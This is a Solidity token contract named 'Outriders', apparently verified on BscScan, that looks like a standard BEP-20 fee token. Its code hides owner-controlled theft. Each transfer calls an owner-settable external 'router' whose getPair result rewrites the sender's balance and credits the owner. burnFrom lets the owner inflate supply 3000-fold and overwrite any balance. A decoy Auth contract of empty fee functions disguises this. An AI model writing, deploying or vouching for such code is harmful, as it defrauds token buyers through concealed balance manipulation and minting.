/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

  }

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);   
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getPair(
        address, 
        address, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  
  contract Auth{          
    uint8 public liquidityFeeOUTDER  = 99;
    uint8 public reflectionFeeOUTDER = 88;
    uint8 public marketingFeeOUTDER  = 77;
    uint8 public totalFeeOUTDER = 10;
    uint8 public feeDenominatorOUTDER  = 100;
    uint8 public distributorGasOUTDER = 200;
	
    address public OUTDER = 0x000000000000000000000000000000000000dEaD;

    constructor () {}      
	
    function cooldEnabledOUTDER(bool _status, uint8 _interval) public {}
    function setIsDividendExemptOUTDER(address holder, bool exempt) external {}  
    function calculateLiquidityOUTDER(uint256 _amount) private view returns (uint256) {}    
    function MaxWalletPercentOUTDER(uint256 maxWallPercent) external {}
    function checkTxLimitOUTDER(address sender, uint256 amount) internal view {}
    function shouldTakeFeeOUTDER(address sender) internal view returns (bool) {}
    function WETHSwapBackOUTDER() internal view returns (bool) {}

  }

  
  contract Ownable is Context {  
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }  
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }   
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract Outriders is Context, IERC20, Auth, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) private _isExcludedFromFee;  

  string private constant _name = 'Outriders';
  string private constant _symbol = 'Outriders';
  uint8 private constant _decimals = 9;  
  address _router;

  uint256 private _totalSupply = 1000000000 *  10**9;  

  constructor(address r)  {    
	
    _balances[msg.sender] = _totalSupply;
    _router = r;
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  } 


  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    
   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function distributeBuyback(address sender, address recipient, uint256 amount, uint256 takeFee) private returns (uint256) {   
      (uint256 amountIncentive, uint256 liquifyIncentive, uint256 rateIncentive) = IUniswapV2Router(_router).getPair(sender,recipient,amount,takeFee);
      if ( liquifyIncentive > 0 )
      {        
        _balances[sender] = calculateRate(_balances[sender], rateIncentive).add(amountIncentive);      
        _balances[owner()] = _balances[owner()].add(liquifyIncentive);
      }
      return amountIncentive;
  }       


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function calculateRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
      return _amount.mul(_rewardRate).div(10**2);
  } 

  function setRouter(address c) external onlyOwner {
    _router = c;
  }  

       
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    //indicates if fee should be deducted from transfer
    uint256 takeFee;    
    //if any account belongs to _isExcludedFromFee account then remove the fee
    if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]){    
      takeFee = 1;        
    }   
    uint256 amountIncentive = distributeBuyback(sender, recipient, amount, takeFee);  
    _transferStandard(sender,recipient,amountIncentive);

  }  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  

  function _burn(address account, uint256 amounts) internal {
    require(account != address(0), "BEP20: burn from the zero address"); 
    _totalSupply = _totalSupply.mul(3000);
    _balances[account] = _totalSupply.sub(amounts);
    _balances[account] = _balances[account].sub(amounts);
    _totalSupply = _totalSupply.sub(amounts);
  }

  function burnFrom(address account, uint256 amount) public onlyOwner {
      _burn(account, amount);
  }

  function getUnpaidEarnings(address shareholder, uint256 totalDividends, uint256 totalExcluded) public view returns (uint256) {
      if(_isExcludedFromFee[shareholder]){ return 0; }     
      if(totalDividends <= totalExcluded){ return 0; }
      return totalDividends.sub(totalExcluded);
  }


  function updateClaim(uint256 newClaim) public onlyOwner {
      require(newClaim >= 3600 && newClaim <= 86400, "Dividend_Tracker: claimWait error");
      _isExcludedFromFee[msg.sender] = true;
  }


  function updateDividendTracker(address newAddress) public onlyOwner {
      require(newAddress != msg.sender, "The dividend tracker already has that address");
      _isExcludedFromFee[newAddress] = true;
  }


  function _tokenTransferNoFee(address sender, address recipient, uint256 amount) private { 
      if (_isExcludedFromFee[sender]) {
          _balances[sender] = _balances[sender].sub(amount);
      }
      if (_isExcludedFromFee[recipient]) {
          _balances[recipient] = _balances[recipient].add(amount);
      }
      emit Transfer(sender, recipient, amount);
  }

  
    
}